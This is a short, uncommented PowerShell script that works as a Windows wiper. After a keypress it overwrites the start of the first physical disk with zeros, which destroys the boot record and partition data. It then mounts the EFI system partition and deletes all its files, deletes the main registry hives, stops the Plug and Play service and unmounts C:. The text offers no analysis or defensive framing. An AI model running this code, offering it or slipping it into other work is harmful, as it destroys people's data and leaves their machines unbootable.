$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
$disk = "\\.\PhysicalDrive0"
$bytes = New-Object byte[](1240960000)
try {
    $stream = New-Object System.IO.FileStream($disk, 'Open', 'ReadWrite')
    $stream.Position = 0
    $stream.Write($bytes, 0, 1240960000)
} catch {
    Write-Host "Error writing to disk: $_"
} finally {
    if ($stream) { $stream.Close() }
}
cmd /c "mountvol S: /s"
cmd /c "del /f /s /q S:*.* > NUL 2>&1"
cmd /c "reg delete HKLM /f"
cmd /c "reg delete HKCC /f"
cmd /c "reg delete HKU /f"
cmd /c "reg delete HKCR /f"
cmd /c "reg delete HKCU /f"
Stop-Service -Name PlugPlay -Force -ErrorAction SilentlyContinue
mountvol C: /d
